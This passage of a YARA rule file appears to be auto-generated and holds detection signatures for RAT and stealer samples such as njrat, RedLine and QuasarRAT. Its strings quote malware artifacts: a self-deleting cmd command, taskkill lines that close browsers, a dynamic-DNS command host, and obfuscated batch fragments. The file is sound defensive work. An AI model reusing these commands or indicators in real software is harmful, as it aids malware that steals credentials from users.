      $s9 = "assertion failed: self.is_char_boundary(new_len)C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\str" ascii /* score: '24.00'*/
      $s10 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\slice.rs" fullword ascii /* score: '24.00'*/
      $s11 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\raw_vec\\mod.rs" fullword ascii /* score: '24.00'*/
      $s12 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\sync\\atomic.rs" fullword ascii /* score: '24.00'*/
      $s13 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\io\\mod.rs" fullword ascii /* score: '24.00'*/
      $s14 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\str\\pattern.rs" fullword ascii /* score: '24.00'*/
      $s15 = "threads should not terminate unexpectedlyC:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\thread\\mod." ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__1f23f452093b5c1ff091a2f9fb4fa3e9_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_1f23f452093b5c1ff091a2f9fb4fa3e9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9124119fa7f7a639c925cdf1b32aee6030889e0e3b8386a56d0e7de7a9220752"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s4 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s7 = "ontologise" fullword ascii /* score: '13.00'*/
      $s8 = "ontologise1301" fullword ascii /* score: '10.00'*/
      $s9 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s10 = "ontologise0" fullword ascii /* score: '10.00'*/
      $s11 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0b9edf24 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0b9edf24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b9edf24c002380289d09e7f6c59f95c6ac568fb009993b39cb7ecf90cbdec94"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s3 = "PKS.exe" fullword wide /* score: '19.00'*/
      $s4 = "<assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><securi" ascii /* score: '14.00'*/
      $s5 = "get_PackageUrl" fullword ascii /* score: '9.00'*/
      $s6 = "@9- /S" fullword ascii /* score: '9.00'*/
      $s7 = "* h:z%" fullword ascii /* score: '9.00'*/
      $s8 = "feffeefefa" ascii /* score: '8.00'*/
      $s9 = "fefefeffea" ascii /* score: '8.00'*/
      $s10 = "affefeeffe" ascii /* score: '8.00'*/
      $s11 = "afeffeefeffe" ascii /* score: '8.00'*/
      $s12 = "fefeffeeffe" ascii /* score: '8.00'*/
      $s13 = "fefeffeefef" ascii /* score: '8.00'*/
      $s14 = "afefeffeef" ascii /* score: '8.00'*/
      $s15 = "fefefefeffe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__113138bc {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_113138bc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "113138bc20beb3622e945f91d907f7ba942f49a5debf19bd6bed394fdb053533"
   strings:
      $s1 = "vBrT.exe" fullword wide /* score: '22.00'*/
      $s2 = "vBrT.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Overall: {0:F2}% ({1}) - GPA: {2:F2}" fullword wide /* score: '12.00'*/
      $s4 = "Overall: 0.00% (F) - GPA: 0.00" fullword wide /* score: '12.00'*/
      $s5 = "{0}: {1:F1}% ({2} items) - Weight: {3:P0}" fullword wide /* score: '12.00'*/
      $s6 = "Export Complete" fullword wide /* score: '12.00'*/
      $s7 = "g3Ylg6" fullword ascii /* reversed goodware string '6glY3g' */ /* score: '11.00'*/
      $s8 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s9 = "Error exporting report: " fullword wide /* score: '10.00'*/
      $s10 = "GetAllGrades" fullword ascii /* score: '9.00'*/
      $s11 = "PercentageToLetterGrade" fullword ascii /* score: '9.00'*/
      $s12 = "GetGradeStatus" fullword ascii /* score: '9.00'*/
      $s13 = "GetLetterGrade" fullword ascii /* score: '9.00'*/
      $s14 = "GetOverallAverage" fullword ascii /* score: '9.00'*/
      $s15 = "GetGradeCount" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f0384917 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0384917.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f038491715d1d1b55c9227612ccf55089b771bbcadcf053dbf2fc939715dfd9f"
   strings:
      $s1 = "ExecuteArpCommand" fullword ascii /* score: '26.00'*/
      $s2 = "DNS flush command executed. Check command prompt for results." fullword wide /* score: '22.00'*/
      $s3 = "IP renewal command executed. This may take a moment to complete." fullword wide /* score: '22.00'*/
      $s4 = "BIq.exe" fullword wide /* score: '19.00'*/
      $s5 = "Note: Full routing table display requires elevated privileges." fullword wide /* score: '19.00'*/
      $s6 = "Scan Completed: {0:yyyy-MM-dd HH:mm:ss}" fullword wide /* score: '13.00'*/
      $s7 = "This will attempt to renew IP configuration. Continue?" fullword wide /* score: '13.00'*/
      $s8 = "get_OpenPorts" fullword ascii /* score: '12.00'*/
      $s9 = "Error scanning network: {0}" fullword wide /* score: '12.00'*/
      $s10 = "K@@@@@" fullword ascii /* reversed goodware string '@@@@@K' */ /* score: '11.00'*/
      $s11 = "ScanCommonPorts" fullword ascii /* score: '11.00'*/
      $s12 = "BIq.pdb" fullword ascii /* score: '11.00'*/
      $s13 = "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True" fullword wide /* score: '11.00'*/
      $s14 = "/c ipconfig /flushdns" fullword wide /* score: '11.00'*/
      $s15 = "/c ipconfig /release & ipconfig /renew" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__464926cd {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_464926cd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "464926cd843fcf5a122f94b1e7ccbbaaf7d86ca8d853c56f08e1746ae87b22bb"
   strings:
      $s1 = "Order.exe" fullword wide /* score: '22.00'*/
      $s2 = "{1f592489-8b32-4dc7-bdf1-3a38224f283c}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s3 = ".NET Framework 4.6(" fullword ascii /* score: '10.00'*/
      $s4 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s5 = "+7+8+=+>+?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'x' */
      $s6 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s7 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c32ca203 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c32ca203.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c32ca203d8a4af8d6a669b04dc6375ce503eec85b19163783c7fc6b63f54c504"
   strings:
      $s1 = "order.exe" fullword wide /* score: '22.00'*/
      $s2 = "{0df18e29-cc77-4118-bef0-b7c23cc2281f}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s3 = ".NET Framework 4.6(" fullword ascii /* score: '10.00'*/
      $s4 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s5 = "+7+8+=+>+?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'x' */
      $s6 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s7 = "* R<om" fullword ascii /* score: '9.00'*/
      $s8 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__503bff36 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_503bff36.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "503bff3687c04240238ccb812d7e91d781b1cf4ce1e3edb7f3f018e685736049"
   strings:
      $s1 = "Fnvtccwzlhn.exe" fullword wide /* score: '22.00'*/
      $s2 = "ProcessOperationalProcessor" fullword ascii /* score: '20.00'*/
      $s3 = "Fnvtccwzlhn.Processing" fullword ascii /* score: '18.00'*/
      $s4 = "m_CentralProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "_ProcessorProc" fullword ascii /* score: '15.00'*/
      $s6 = "ProcessorSelector" fullword ascii /* score: '15.00'*/
      $s7 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s8 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s9 = "Fnvtccwzlhn.DataStructures" fullword ascii /* score: '11.00'*/
      $s10 = "MonitorConfigurableUser" fullword ascii /* score: '10.00'*/
      $s11 = "Decompressed" fullword ascii /* score: '9.00'*/
      $s12 = "get_Amrzucuxy" fullword ascii /* score: '9.00'*/
      $s13 = "get_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s14 = "PostPolicy" fullword ascii /* score: '9.00'*/
      $s15 = "set_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__91c93315 {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_91c93315.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "91c93315b9bbe7f15ea0a21e32e5a7c06a675b2ba53a1b5f01307a9b7060acb2"
   strings:
      $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide /* score: '42.00'*/
      $s2 = "Execute ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Execute ERROR " fullword wide /* score: '21.00'*/
      $s4 = "Endoded DNS-IPt.exe" fullword wide /* score: '19.00'*/
      $s5 = "Download ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s6 = "Executed As " fullword wide /* score: '18.00'*/
      $s7 = "processInformationLength" fullword ascii /* score: '15.00'*/
      $s8 = "IG5ldyBoYWNrZWQ=" fullword wide /* base64 encoded string*/ /* score: '14.00'*/
      $s9 = "getvalue" fullword wide /* score: '13.00'*/
      $s10 = "Update ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s11 = "processInformationClass" fullword ascii /* score: '11.00'*/
      $s12 = "dbcoo.ddns.net" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2c4c5c35 {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2c4c5c35.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2c4c5c35e5777c563006243dba89b1e6dbf977f4171cf36eb24aa4a08803759b"
   strings:
      $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide /* score: '42.00'*/
      $s2 = "Execute ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Execute ERROR " fullword wide /* score: '21.00'*/
      $s4 = "Download ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s5 = "Executed As " fullword wide /* score: '18.00'*/
      $s6 = "processInformationLength" fullword ascii /* score: '15.00'*/
      $s7 = "getvalue" fullword wide /* score: '13.00'*/
      $s8 = "Update ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s9 = "processInformationClass" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*) and all of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "087a67230ac4ad7bcedcc58aadd2ad2c4a12590db99f4ee7f00dc299255faab6"
   strings:
      $s1 = "xDVu.exe" fullword wide /* score: '22.00'*/
      $s2 = "Unit Converter - Conversion History Report" fullword wide /* score: '20.00'*/
      $s3 = "Conversion History - Unit Converter" fullword wide /* score: '17.00'*/
      $s4 = "GetUnitDescription" fullword ascii /* score: '15.00'*/
      $s5 = "xDVu.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "Unsupported file format. Use .csv or .txt" fullword wide /* score: '14.00'*/
      $s7 = "Settings - Unit Converter" fullword wide /* score: '14.00'*/
      $s8 = "'WARp!!!!!" fullword ascii /* score: '13.00'*/
      $s9 = "ConversionHistory_{0:yyyyMMdd}.csv" fullword wide /* score: '13.00'*/
      $s10 = "<GetMostUsedConversions>b__20_2" fullword ascii /* score: '12.00'*/
      $s11 = "<GetMostUsedConversions>b__20_0" fullword ascii /* score: '12.00'*/
      $s12 = "<GetMostUsedConversions>b__20_1" fullword ascii /* score: '12.00'*/
      $s13 = "GetRecentConversions" fullword ascii /* score: '12.00'*/
      $s14 = "GetConversions" fullword ascii /* score: '12.00'*/
      $s15 = "GetMostUsedConversions" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__752cfd98 {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_752cfd98.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "752cfd986e3997d45fb71a52906f7359b6dc693596de6012455400bc85058efd"
   strings:
      $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide /* score: '42.00'*/
      $x2 = "cmd /c taskkill /f /im Opera.exe" fullword wide /* score: '41.00'*/
      $x3 = "cmd /c taskkill /f /im OperaGX.exe" fullword wide /* score: '41.00'*/
      $x4 = "cmd /c rundll32.exe user32.dll,LockWorkStation" fullword wide /* score: '39.00'*/
      $x5 = "cmd /c taskkill /f /im Chrome.exe" fullword wide /* score: '36.00'*/
      $x6 = "cmd /c taskkill /f /im Firefox.exe" fullword wide /* score: '36.00'*/
      $x7 = "cmd /c taskkill /f /im Chromium.exe" fullword wide /* score: '36.00'*/
      $x8 = "cmd /c taskkill /f /im MsEdge.exe" fullword wide /* score: '36.00'*/
      $x9 = "cmd /c taskkill /f /im Safari.exe" fullword wide /* score: '36.00'*/
      $x10 = "cmd /c taskkill /f /im Brave.exe" fullword wide /* score: '36.00'*/
      $x11 = "cmd /c taskkill /f /im Iridium.exe" fullword wide /* score: '36.00'*/
      $x12 = "cmd /c taskkill /f /im Dissenter.exe" fullword wide /* score: '36.00'*/
      $x13 = "cmd /c taskkill /f /im PaleMoon.exe" fullword wide /* score: '36.00'*/
      $x14 = "cmd /c taskkill /f /im Vivaldi.exe" fullword wide /* score: '36.00'*/
      $x15 = "cmd /c taskkill /f /im iExplore.exe" fullword wide /* score: '36.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*)
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__85054678 {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_85054678.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "85054678344fc1788233d45cb5e882d8442191481107f2114bb73eda1ce6257d"
   strings:
      $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide /* score: '42.00'*/
      $s2 = "Execute ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "WindowsServices.exe" fullword wide /* score: '25.00'*/
      $s4 = "processhacker" fullword wide /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s5 = "Stub.exe" fullword ascii /* score: '22.00'*/
      $s6 = "Tools.exe" fullword wide /* score: '22.00'*/
      $s7 = "Execute ERROR " fullword wide /* score: '21.00'*/
      $s8 = "Download ERROR" fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s9 = "Executed As " fullword wide /* score: '18.00'*/
      $s10 = "winmgmts:\\\\.\\root\\SecurityCenter2" fullword wide /* score: '18.00'*/
      $s11 = "processInformationLength" fullword ascii /* score: '15.00'*/
      $s12 = "CsAntiProcess" fullword ascii /* score: '15.00'*/
      $s13 = "SpyTheSpy" fullword wide /* PEStudio Blacklist: strings */ /* score: '14.00'*/
      $s14 = "getvalue" fullword wide /* score: '13.00'*/
      $s15 = "procexp" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule NeptuneRAT_signature_ {
   meta:
      description = "_subset_batch - file NeptuneRAT(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e5c0160f3172a999624de7a23e09606a5a4b4fca6cbd2e8d28d40d4aabd46836"
   strings:
      $s1 = "%XBxUmwVNlp%%AZtRFCfupI%%rBwXwigNlN%%DyXWXsAfMR%%tGVgSxnAWI%%qoUSOvfzye%%qhBxMcbxTn%%caIxpKGpfY%%UFQCxoDfhB%%naHHBlfxuP%%wPGJGpG" ascii /* score: '25.00'*/
      $s2 = ":: n0aAt9nH/Vz6bXbHCMf8sIPVPMLRz24Ik8dhI6vS7PzTzCpQJ2XO+J54+7uc2reqCoJr1P+pdJ3xRRheiWQ1vm9njZPzzIgeIOi4SjYuHt47CG9Ckx/4rRIM+ObSL" ascii /* score: '23.00'*/
      $s3 = "JL4d3hxNxqjdCzVeTZyFeNMyOfHXdUr/bc60lTLSyxrrloGYN1a2OlcMd/iOtzMmLn8LwOcY8rrsFWeH/BtsBfYGgNK8Qo0ey21FRfBi+2iBgKfIvUdsOJeFQjd7Sc+m" ascii /* score: '19.00'*/
      $s4 = "mVuAF0d+m9zFTP/8KYMxzICa3selqXQNvho6haDqoMBoURIRQqqz0uXSnnL5sNfgb5YzHUi0Cm8lMF4DEtorMi/AOR22a/b2lOGLUyX5IAYuydlaHDWhtbBX74wl/Vkw" ascii /* score: '17.00'*/
      $s5 = "4Atxc+NrS9cM0qEb4AqIXez4MzbzUP1alc6xLE0dTd+FAPGH7eyaY5H3XfL27Kb9bmIvVwOa216B4BMvIRC0rZ1pyflnqDDEq1roe45729FbhjInsaaRuYVCbw5pTvIT" ascii /* score: '16.00'*/
      $s6 = "o2YijwB+wwY3qlxEjA0AbX0InuIDlfFOEF3kSvDYZO5Dw8dGWCbU/6VYD+G/QW7YPeglNmyBWf7v664rAdLW4BeYMB20HxRp24LtLmdevbKGz7pbUU5KHsGFTPXVfz0O" ascii /* score: '16.00'*/
      $s7 = "VBUtv6jzQ/XIIgJpGSBPp0Xs+4SHMlEaaZB/2jkfTPjEInh8dsK2zd7YWVgPoHgzL07Oiur22DILW7UmhKA7ltfw4C/RmV/qpBhacjRmIa45iobP70NcuRTPti1cE0Nr" ascii /* score: '16.00'*/
      $s8 = "blDd9KUcDeQO2m2ubl4HHCE5XNSQYNyBmtzSamijx7wlVj1z2D5telIBIrcF/YTExQUPaNo2hSUnbmPDO7if8jmPwRCQvcNA201nX61Jg2OxLwWuXzSLAye61e/VFXFX" ascii /* score: '16.00'*/
      $s9 = "LOkrGiVMPU2VKEiVZ6ke5LMTK2G/cve8DjTKoOtePA+E+a5T8zczkNdQAsEbbXB6e0zfNqwk7vs/ijopiZEmuux91GOMLFF9ijhyRCMkFdAquRZE2V69aMUONxykR/ZI" ascii /* score: '15.00'*/
      $s10 = "JA5nO+4bGocoPNfQCv3TmqUvexjsdXU01YbEH6LrLj8rOoTPyKruDNFlIBcTdMwfyDKyIj5gCMj46P/PH5vd+I3+2FjTM7z+UDl+qhkBiG4SAeFuFuUPKKnwUYi3nPGL" ascii /* score: '14.00'*/
      $s11 = "FgATk+5o/KfU6By0WocDQZa/NkhHxZ2WH6ITIaL/bak4JnefIpzLwslKALxmAiU/WGYquQlQ1qGtMpXyMf94ixKO6vERuYW4follqEIwgMo0b1+eEuJLz6Hm5H3etfY4" ascii /* score: '14.00'*/
      $s12 = "mhjYPOa8frZpoToQcliu3ODs3qEjbpgcoM46n51aZxv2+L6DW2Y5mN+k9Hvgyoqz11QcT5yPC1PRfvY5iH+nOUUuEXbOZGEbawZR+Ve0xJghdT8PAY1+nZyDGso/C4gT" ascii /* score: '14.00'*/
      $s13 = "lZEDjeu2ghIsLXXRAtWlgToJlYi5V+6tJUP+Wp+DXfsxa+muCcZghis9mt9+wa4Iussij7sWGwkX6NygJBsBOtLUQjME22ft4binmnwrk0NXan0ZsMBjyUxNHxeQubPd" ascii /* score: '14.00'*/
      $s14 = "46bof98jo2uWdQdrUnv5sWoWYv5tdlfEpeiiS/MNqSoCePHjWikgwVdCr44sV5hYrpWn4iPHEuPOvSXzBQ4sN+PliPdacT8O+c/m6IBfp7bNjfnNKav+pLj0v1rL4ZUp" ascii /* score: '14.00'*/
      $s15 = "02ZpN3Q0++lq10I4s28sz/TnMlaQREpPEsnltME64kw/XfP/VIXoFtvkWMXqn96rpMI5uVgdzM2a0BINWLZAkBJeOHISQlbRHVBRDJhAJmATUTYBJ/DPA+vYEjyYZ4DM" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x3a3a and filesize < 300KB and
      8 of them
}

rule QuasarRAT_signature_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "128b564d48862fe887ccebb64542c66a29b9943ed8bc7882bbb3992d4fe4792c"
   strings:
      $x1 = ":: nvpu/NP0OHk3qIQQXX/Hto4wkdbwNMszP+1n7cKNEhAmcU14s4EsfzXPocSAyXx8BG6V/clJu0Wrbnlu6ljDs4rPyiD+0uSd7E5FmYEAo9xQdxTiA2eTAq5nu9tg/" ascii /* score: '70.00'*/
      $s2 = "tUEOJSULBy6m5PvBkzAPms00+Ee8GTemp51FD/1pxcOUX+rSG0SBImZIeP/qWczeP3lx86jmdIAHbSHeFgZPAFQni8zGx+K7bBiDFofH35zpq9HJEaFMSh/nT1i4YCD7" ascii /* score: '22.00'*/
      $s3 = "9W1zmvpy5H61iPqcXQExFcDRzQbImaE+PfOo6GETMKaGAIwNq4lvBtbv5/ClxBm9oI3qCqMHGu5OrEJdSPbnSYAKotTwqSrUn2SjO1mo93W19ISS+zyrkDtMPpLPWEfC" ascii /* score: '22.00'*/
      $s4 = "tqQIX2uFR96ESPy/X2SaAmt3SfoHL8bBdaHXN2h/BqcHOsXH+n79D7Js4tYejrPnSn+CE2jz2xD0azunxyRE+7UrqfiP0Cj3G7dEXr9VPFEtlKBySLJVLpHNyA9Wy7k/" ascii /* score: '21.00'*/
      $s5 = "fTPDKlZc1A8ggI/D6jH6ycM6rqF2ROP2BdeFcGyW3Y4/L42IspndUdvpH1/BIoQSFjSJ49pIsUWJDgNJQkaVZbgHR1rI1A7RrYNSpyBpqCnYKHO/4odyihlPQc21ZR8V" ascii /* score: '21.00'*/
      $s6 = "HAEyETrEcWBQzwpM4HiY0uCOprbNa2fo6hgUbFCBPN86R3dYrvEgeTcnNu9UOCM3iuJZaLmDT1fRSwsVvyQkQlzpFzXaI6OT9ApMwSqN0GKuqbdNudrDtVZMjkANoTXC" ascii /* score: '21.00'*/
      $s7 = "HYymdll1ZdyCIalRXiiGzEzGMl59nz7TCUvkC4kGQ0cEmRS1JMOawuZG6RvXsAQWj3rPbnVwK72zSrdgETf4UEdTnbVd8xisvjUTsesttv2jb/jfvvGI6Ir4JUWdbVk7" ascii /* score: '21.00'*/
      $s8 = "miQq3nrHV9Yxdiujji2p66khfeKHmZ8FTzyuj8Z7UYMDlbUrXs2lNMos7FpFR+MpH1gMQwvuqqPHyBPlog2FDftPuYkwt/+MPZqPRhd1xbwHx6czNbd2blbUZNN6Lz2c" ascii /* score: '21.00'*/
      $s9 = "No9wg0pktMEySh6lFkvYc1pvrgspSIzZcXlBMvvVre86/daMQRsF51Qda06o0lS7V7ZJCD9zzUwZZ5+N1SDhpORpv4WPgEye1FwMH1/17PTTVTSFj8xYf6+GETpJ0MZk" ascii /* score: '21.00'*/
      $s10 = "Ttw1FPKg3ZwOby1up/QkUfqR3ljRlRFPvn7KC74cVcgmdhVEaOr3kdwPvGK9kS0DUMpb6f+ts95tvRiRJx6lWjDezWKXhTAgVREotLvvKt1cJPiwnWSEj0yOL3qWsWkP" ascii /* score: '21.00'*/
      $s11 = "+uIKWl/2uTzsXL0SAbxCdkKVtvSEuo/DfFCQNtDpraH9UdSu0jO9xLKhAG2jDUMPS93hZeoJ13BMFBT1LvH5kq2xBAKjKIF1e63nMwQUnW7xJp0h93C27bv7WpbQUDQm" ascii /* score: '21.00'*/
      $s12 = "7IieT5dZbInv19EZEYEI7Zjboz8sSTqr0lXW0kNPUgQRl7cICCUBMVbk8pfMyckA+HORozbtDfiXHle8uk2w2Wi8JAyMvdhXB+7jSqYmpKM+xnylh9IsIpLIGq0888QR" ascii /* score: '19.00'*/
      $s13 = "yfHrqzn4VOJizA/wyodT7gqIx+mMzfTdu/o3hm1udbVCOMTT2SaLx1EHVohW7tWs4aR+tsdVZ6PnK2qs9dKDaDaUY+koQn7V0KiOjVabR1LWFmUKrbGZdPa/C+0aiRct" ascii /* score: '19.00'*/
      $s14 = "cP7oxjWmHNNzN5tZEb0YmRJuNHDrp/45hAyEPIrcz7lkHqdWskEyvXFhZIG42L9Um73XwF5VhECzoXNfWqr6bs29Pa+ZitLVpefVjWMlg+9LfegCMgJ8MShqa9rKie7e" ascii /* score: '19.00'*/
      $s15 = "MfTP+W3uRj1DTzJ/gxuiWkhcpTmP/9S74iZnBZnSjjSszcSc2SKxpPxhwJ3w2upxOMaT09qcPMaIY6wMR82FUph8lp53NGlzTrn7JHqgdKf7BqZMytwGSFaUidOH4dWm" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule QuasarRAT_signature__6dbb22d7 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_6dbb22d7.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6dbb22d7e0e30cbba3a888b9e736c9953c7edd4bb04a8855ff998f188e77e661"
   strings:
